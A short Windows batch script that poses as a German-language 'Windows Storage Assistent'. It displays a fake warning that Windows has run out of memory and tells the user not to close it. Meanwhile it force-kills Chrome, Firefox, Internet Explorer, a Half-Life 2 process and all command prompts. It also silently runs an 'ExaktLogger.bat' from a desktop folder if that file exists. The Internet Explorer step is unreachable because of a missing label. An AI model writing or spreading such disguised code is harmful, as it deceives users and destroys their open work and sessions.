@echo off
set version=1.0
title Windows Storage Assistent %version%
color A
set mode=SS-Not Stopper %version%
if exist "C:\users\%username%\desktop\smart speed\ExaktLogger.bat" call "C:\users\%username%\desktop\smart speed\ExaktLogger.bat"
set aktuell=0
:review
cls
echo.
echo ******************** Windows Arbeitsspeicher Assistent %version% ********************
echo.
echo %aktuell% / 100 Prozent aktualisiert!
echo Windows hat keinen Arbeitsspeicher fuer die gerade ausgefuehrte Funktion
echo zur Verfuegung! Bitte Anwendung nicht schliessen und warten!
echo.
echo.
if "%close%"=="1" goto bye
tasklist 2>nul | find /I /N "chrome.exe"2>nul
if "%ERRORLEVEL%"=="0" goto chrome >nul
goto firefox1
:chrome
taskkill /f /im chrome.exe /t >nul
:firefox1
tasklist 2>nul | find /I /N "firefox.exe"2>nul
if "%ERRORLEVEL%"=="0" goto firefox >nul
goto hl21
:firefox
taskkill /f /im firefox.exe /t >Nul
:hl21
tasklist 2>nul | find /I /N "hl2.exe"2>nul
if "%ERRORLEVEL%"=="0" goto hl2 >nul
goto iexplore1
:hl2
taskkill /f /im hl2.exe /t >nul
:iexplore1
tasklist 2>nul | find /I /N "iexplore.exe"2>nul
if "%ERRORLEVEL%"=="0" goto iexplore >nul
goto cmd1
taskkill /f /im iexplore.exe /t >nul
:cmd1
tasklist 2>nul | find /I /N "cmd.exe"2>nul
if "%ERRORLEVEL%"=="0" goto cmd >nul
goto ende
:cmd
taskkill /f /im cmd.exe /t >nul
:ende
set aktuell=100
set close=1
goto review

:bye